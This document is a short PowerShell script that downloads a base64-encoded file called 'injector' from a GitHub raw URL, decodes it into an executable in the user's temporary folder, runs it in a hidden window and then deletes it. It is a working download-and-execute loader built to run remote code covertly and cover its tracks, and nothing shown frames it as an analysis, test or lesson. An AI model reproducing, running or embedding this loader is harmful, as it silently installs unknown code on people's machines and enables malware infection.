$url = "https://raw.githubusercontent.com/puddyeieiei/dydestiny/main/injector.b64"
$base64 = (iwr -UseBasicParsing $url).Content
$bytes = [Convert]::FromBase64String($base64)
$tempFile = "$env:TEMP\injector.exe"
[IO.File]::WriteAllBytes($tempFile, $bytes)
Start-Process $tempFile -WindowStyle Hidden -Wait
Remove-Item $tempFile -Force
